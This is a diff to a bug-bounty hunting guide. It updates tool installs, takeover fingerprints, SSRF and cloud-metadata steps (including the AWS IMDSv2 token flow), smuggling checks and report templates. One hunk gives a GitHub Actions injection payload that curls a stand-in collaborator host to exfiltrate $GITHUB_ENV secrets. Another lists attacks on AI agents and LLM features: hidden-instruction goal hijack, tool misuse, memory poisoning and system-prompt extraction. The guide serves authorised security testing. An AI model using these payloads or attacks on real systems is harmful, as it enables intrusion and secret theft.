@@ -196,10 +196,10 @@ Client -> CDN -> Load Balancer -> App Server -> Database
 | cloudenum | Cloud asset enumeration | `pip3 install cloud_enum` |
 | trufflehog | Secret scanning | `brew install trufflehog` |
 | gitleaks | Secret scanning | `brew install gitleaks` |
-| XSStrike | Advanced XSS scanner | `pip3 install xsstrike` |
-| SecretFinder | JS secret extraction | `pip3 install secretfinder` |
+| XSStrike | Advanced XSS scanner | `git clone https://github.com/s0md3v/XSStrike && pip3 install -r XSStrike/requirements.txt` (PyPI `xsstrike` is an unofficial fork) |
+| SecretFinder | JS secret extraction | `git clone https://github.com/m4ll0k/SecretFinder && pip3 install -r SecretFinder/requirements.txt` (PyPI `secretfinder` is an unrelated project) |
 | sqlmap | SQL injection | `pip3 install sqlmap` |
-| subzy | Subdomain takeover | `go install github.com/LukaSikic/subzy@latest` |
+| subzy | Subdomain takeover | `go install github.com/PentestPad/subzy@latest` |
 
 ## Static Analysis (Semgrep Quick Audit)
 ```bash
@@ -314,7 +314,7 @@ curl -s "https://hackerone.com/graphql" \
 ```
 
 ## Quick Wins Checklist
-- [ ] Subdomain takeover (`subjack`, `subzy`)
+- [ ] Subdomain takeover (`nuclei -tags takeover`, `subzy`, `subjack`; subjack v3.x is maintained and embeds its fingerprints, no `-c` file)
 - [ ] Exposed `.git` (`/.git/config`)
 - [ ] Exposed env files (`/.env`, `/.env.local`)
 - [ ] Default credentials on admin panels
@@ -531,6 +531,7 @@ grep -rn "TODO\|FIXME\|not signed\|not verified\|for now" --include="*.rs" | gre
 ## SSRF -- Server-Side Request Forgery
 
 - [ ] Try cloud metadata: `http://169.254.169.254/latest/meta-data/`
+- [ ] IMDSv2 check: if plain GETs to the AWS metadata IP return `401`, the instance requires IMDSv2. Only an SSRF that controls method and headers gets through (`PUT /latest/api/token` with `X-aws-ec2-metadata-token-ttl-seconds`, then `GET` with `X-aws-ec2-metadata-token`). See EC2 Metadata under Cloud / Infra Misconfigs.
 - [ ] Try internal services: `http://127.0.0.1:6379/` (Redis), `:9200` (Elasticsearch), `:27017` (MongoDB)
 - [ ] Test all IP bypass techniques (see table below)
 - [ ] Test protocol bypass: `file://`, `dict://`, `gopher://`
@@ -735,22 +736,41 @@ SeLeCt * FrOm uSeRs
 
 ### Agentic AI Hunting (OWASP ASI01-ASI10)
 
-When target has AI agents with tool access, these are the 10 attack classes:
+When the target has AI agents with tool access, use the OWASP Top 10 for Agentic Applications (version 2026, released 2025-12-09, https://genai.owasp.org/resource/owasp-top-10-for-agentic-applications-for-2026/):
 
-| ID | Vuln Class | What to Test |
-|----|-----------|-------------|
-| ASI01 | Prompt injection | Override system prompt via user input -- make agent ignore its rules |
-| ASI02 | Tool misuse | Make AI call tools with attacker-controlled params (SSRF via "fetch URL", RCE via code tool) |
-| ASI03 | Data exfil | Extract training data / PII via crafted prompts that leak context |
-| ASI04 | Privilege escalation | Use AI to access admin-only tools -- agent has broader perms than user |
-| ASI05 | Indirect injection | Poison document/URL the AI processes -- hidden instructions in fetched content |
-| ASI06 | Excessive agency | AI takes destructive actions without confirmation -- delete, send, pay |
-| ASI07 | Model DoS | Craft inputs that cause infinite loops, excessive token usage, or OOM |
-| ASI08 | Insecure output | AI generates XSS/SQLi/command injection in its output that gets rendered |
-| ASI09 | Supply chain | Compromised plugins/tools/MCP servers the AI calls |
-| ASI10 | Sensitive disclosure | AI reveals internal configs, API keys, system prompts, user data |
+| ID | Risk | What to Test |
+|----|------|-------------|
+| ASI01 | Agent Goal Hijack | Hidden instructions in content the agent reads (documents, emails, calendar invites, fetched URLs, tool output) redirect its goal or task selection |
+| ASI02 | Tool Misuse and Exploitation | Agent calls a legitimate tool with attacker-chosen params or in an unsafe order (SSRF via "fetch URL", exfil via email/HTTP tool, delete/send/pay without confirmation) |
+| ASI03 | Identity and Privilege Abuse | Agent acts on a cached, delegated or service credential broader than the user's: reach admin-only tools or another tenant's data through the agent |
+| ASI04 | Agentic Supply Chain Vulnerabilities | Third-party tools, plugins, MCP / A2A servers, registries or prompt templates loaded at runtime: tampered tool descriptions, look-alike servers |
+| ASI05 | Unexpected Code Execution (RCE) | Code-interpreter / "run this" / vibe-coding features: prompt -> generated code -> execution outside the sandbox, unsafe deserialization or template eval |
+| ASI06 | Memory & Context Poisoning | Seed long-term memory, RAG stores, summaries or shared context so later sessions or other users act on attacker data |
+| ASI07 | Insecure Inter-Agent Communication | Spoof, replay or tamper with agent-to-agent messages on APIs or buses that lack authentication or integrity |
+| ASI08 | Cascading Failures | One poisoned input or faulty tool result propagates through chained agents into privileged actions: map the blast radius |
+| ASI09 | Human-Agent Trust Exploitation | Agent output persuades a user or approver to take the harmful step (approve a payment, paste a secret, follow a link) |
+| ASI10 | Rogue Agents | A compromised or misaligned agent keeps acting outside its scope after the initial intrusion |
 
-**Triage rule:** ASI alone = Informational. Must chain to IDOR/exfil/RCE/ATO for paid bounty.
+ASI08-ASI10 describe propagation and governance; in bug bounty they frame a chain's impact and are rarely a standalone finding.
+
+### OWASP LLM Top 10 (2025)
+
+For a single LLM feature (chatbot, summariser) without agentic tool use, map findings to https://genai.owasp.org/llm-top-10/:
+
+| ID | Risk | What to Test |
+|----|------|-------------|
+| LLM01 | Prompt Injection | Direct: override the system prompt via user input. Indirect: hidden instructions in a document/URL the AI processes |
+| LLM02 | Sensitive Information Disclosure | AI reveals other users' data, PII, API keys or internal configs from its context |
+| LLM03 | Supply Chain | Compromised models, plugins, datasets or MCP servers the feature depends on |
+| LLM04 | Data and Model Poisoning | Poison fine-tuning data, feedback loops or user-contributed corpora |
+| LLM05 | Improper Output Handling | AI output rendered or executed unsanitised: XSS, SQLi, command injection |
+| LLM06 | Excessive Agency | AI takes destructive actions without confirmation -- delete, send, pay |
+| LLM07 | System Prompt Leakage | Extract the system prompt via roleplay/encoding; impact only if it holds secrets or auth logic |
+| LLM08 | Vector and Embedding Weaknesses | Cross-tenant retrieval from a shared vector store / RAG index |
+| LLM09 | Misinformation | Usually out of scope unless the program lists it |
+| LLM10 | Unbounded Consumption | Inputs that cause infinite loops, excessive token usage, cost or OOM (model DoS); check the program's DoS rules first |
+
+**Triage rule:** ASI / LLM class alone = Informational. Must chain to IDOR/exfil/RCE/ATO for paid bounty.
 
 ## Cache Poisoning / Web Cache Deception
 - [ ] Test `X-Forwarded-Host`, `X-Original-URL`, `X-Rewrite-URL` -- unkeyed headers reflected in response
@@ -764,6 +784,7 @@ When target has AI agents with tool access, these are the 10 attack classes:
 - [ ] TE.CL: Transfer-Encoding processed by frontend, Content-Length by backend
 - [ ] H2.CL: HTTP/2 downgrade smuggling
 - [ ] TE obfuscation: `Transfer-Encoding: xchunked`, tab prefix, space prefix
+- [ ] 0.CL / Expect desync (Kettle, "HTTP/1.1 must die", Aug 2025, https://portswigger.net/research/http1-must-die): front-end ignores an obfuscated `Content-Length` that the back-end honours, or the two disagree over `Expect: 100-continue`. Detect with HTTP Request Smuggler v3.0; 0.CL needs an early-response gadget (e.g. `/con` on IIS, a server-level redirect) to escape the deadlock. Payloads in `security-arsenal`
 - [ ] Use Burp "HTTP Request Smuggler" extension -- detects automatically
 
 ### CL.TE Example
@@ -977,7 +998,8 @@ github.head_ref
 
 ```bash
 # Step 1: Create an issue with injection payload in title
-gh issue create --repo TARGET/REPO --title '"; curl https://ATTACKER.burpcollaborator.net/$(cat $GITHUB_ENV | base64 -w0) #' --body "test"
+gh issue create --repo TARGET/REPO --title '"; curl https://COLLAB.oastify.com/$(cat $GITHUB_ENV | base64 -w0) #' --body "test"
+# COLLAB.oastify.com = your Burp Collaborator payload host (*.oastify.com since Burp 2022.3) or an interactsh host
 
 # Step 2: If workflow triggers on issues and interpolates title → secrets exfiltrated
 # CVSS: 9.3 Critical (RCE with repo secrets)
@@ -1166,19 +1188,21 @@ ${7*7}           -> 49 = Freemarker / Pebble / Velocity
 cat /tmp/subs.txt | dnsx -silent -cname -resp | grep -i "CNAME" | tee /tmp/cnames.txt
 # Look for CNAMEs to: github.io, heroku.com, azurewebsites.net, netlify.app, s3.amazonaws.com
 
-# Automated takeover detection
-nuclei -l /tmp/subs.txt -t ~/nuclei-templates/takeovers/ -o /tmp/takeovers.txt
+# Automated takeover detection (HTTP fingerprints live in http/takeovers/; Azure and
+# Elastic Beanstalk NXDOMAIN checks live in dns/ -- `-tags takeover` covers both)
+nuclei -l /tmp/subs.txt -t ~/nuclei-templates/http/takeovers/ -o /tmp/takeovers.txt
 ```
 
 ### Quick-Kill Fingerprints
+Status per can-i-take-over-xyz (checked 2026-10): only "Vulnerable" rows are claimable by default; "Edge case" needs a real claim; "Not vulnerable" is not a finding on the string alone.
 ```
-"There isn't a GitHub Pages site here"  -> GitHub Pages
-"NoSuchBucket"                          -> AWS S3
-"No such app"                           -> Heroku
-"404 Web Site not found"                -> Azure App Service
-"Fastly error: unknown domain"          -> Fastly CDN
-"project not found"                     -> GitLab Pages
-"It looks like you may have typed..."   -> Shopify
+"There isn't a GitHub Pages site here"       -> GitHub Pages (Edge case)
+"NoSuchBucket"                               -> AWS S3 (Vulnerable)
+"No such app"                                -> Heroku (Edge case)
+"404 Web Site not found"                     -> Azure App Service (Vulnerable; README fingerprint is NXDOMAIN)
+"Fastly error: unknown domain"               -> Fastly CDN (Not vulnerable)
+"project not found"                          -> Surge.sh (Vulnerable); GitLab Pages is Not vulnerable
+"Sorry, this shop is currently unavailable." -> Shopify (Edge case)
 ```
 
 ### Impact Escalation
@@ -1250,6 +1274,18 @@ http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/def
 # Azure (needs header Metadata: true):
 http://169.254.169.254/metadata/instance?api-version=2021-02-01
 ```
+
+**AWS IMDSv2 (session token):** when the instance requires IMDSv2, the plain GETs above return `401`. The SSRF must let you choose the method and add headers (AWS docs flow, two requests):
+```http
+PUT /latest/api/token HTTP/1.1
+Host: 169.254.169.254
+X-aws-ec2-metadata-token-ttl-seconds: 21600
+
+GET /latest/meta-data/iam/security-credentials/ HTTP/1.1
+Host: 169.254.169.254
+X-aws-ec2-metadata-token: <token returned in the PUT response body>
+```
+GET-only or header-less SSRF cannot reach an IMDSv2-required instance: record IMDSv2 as the blocking control, not as a finding. A PUT response hop limit of 1 also keeps the token from reaching a client one network hop further away (e.g. a container).
 
 ### Firebase Open Rules
 ```bash
@@ -1331,10 +1367,10 @@ Read your report as if you're a tired triager at 5pm on a Friday. Does it pass?
 
 ### Gate 3: Report Quality (10 minutes)
 ```
-[ ] Title: One sentence, contains vuln class + location + impact
+[ ] Title: <asset> | <bug class> | <impact> (see Report Title Formula)
 [ ] Steps to reproduce: Copy-pasteable HTTP request
 [ ] Evidence: Screenshot/video showing actual impact (not just 200 response)
-[ ] Severity: Matches CVSS 3.1 score AND program's severity definitions
+[ ] Severity: Matches program-selected CVSS (3.1 / 4.0) score AND program's severity definitions
 [ ] Remediation: 1-2 sentences of concrete fix
 ```
 
@@ -1391,7 +1427,7 @@ These low findings become valid bugs when chained:
 ## HackerOne Report Template
 
 ```
-Title: [Vuln Class] in [endpoint/feature] leads to [Impact]
+Title: <asset> | <bug class> | <impact>
 
 ## Summary
 [2-3 sentences: what it is, where it is, what attacker can do]
@@ -1411,14 +1447,15 @@ An attacker can [specific action] resulting in [specific harm].
 [Quantify if possible: "This affects all X users" or "Attacker can access Y data"]
 
 ## Severity Assessment
-CVSS 3.1 Score: X.X ([Severity label])
+CVSS 3.1 Score: X.X ([Severity label])   <- or CVSS:4.0/AV:N/... if the program selected 4.0
 Attack Vector: Network | Complexity: Low | Privileges: None | User Interaction: None
 ```
+HackerOne supports CVSS 4.0 (since March 2025) and, from 2026-09-21, requires a severity on submission using the program's chosen method (CVSS 3.1, CVSS 3.0, CVSS 4.0 or manual; programs can switch the requirement off). Score with whatever the program's form selects. Details: `report-writing` > Platform policy.
 
 ## Bugcrowd Report Template
 
 ```
-Title: [Vuln] at [endpoint] -- [Impact in one line]
+Title: <asset> | <bug class> | <impact>
 
 Bug Type: [IDOR/SSRF/XSS/etc]
 Target: [URL or component]
@@ -1449,16 +1486,18 @@ Fix Suggestion:
 ## Report Title Formula
 
 ```
-[Bug Class] in [Exact Endpoint/Feature] allows [attacker role] to [impact] [victim scope]
+<asset> | <bug class> | <impact>
 ```
+
+Asset = exact host + endpoint/feature. Bug class = include the attacker role (unauthenticated / authenticated). Impact = what the attacker gets and whose.
 
 **Good titles:**
 ```
-IDOR in /api/v2/invoices/{id} allows authenticated user to read any customer's invoice data
-Missing auth on POST /api/admin/users allows unauthenticated attacker to create admin accounts
-Stored XSS in profile bio field executes in admin panel -- allows privilege escalation
-SSRF via image import URL parameter reaches AWS EC2 metadata service
-Race condition in coupon redemption allows same code to be used unlimited times
+/api/v2/invoices/{id} | Authenticated IDOR | any user reads every customer's invoice data
+POST /api/admin/users | Missing auth (unauthenticated) | attacker creates admin accounts
+Profile bio field | Stored XSS executing in admin panel | privilege escalation to admin
+Image import URL parameter | SSRF | AWS EC2 metadata service reachable
+Coupon redemption | Race condition | same code redeemed unlimited times
 ```
 
 **Bad titles:**
@@ -1479,7 +1518,7 @@ This requires [prerequisites] and leaves [detection/reversibility].
 ## The 60-Second Pre-Submit Checklist
 
 ```
-[ ] Title follows formula: [Class] in [endpoint] allows [actor] to [impact]
+[ ] Title follows formula: <asset> | <bug class> | <impact>
 [ ] First sentence states exact impact in plain English
 [ ] Steps to Reproduce has exact HTTP request (copy-paste ready)
 [ ] Response showing the bug is included (screenshot or response body)
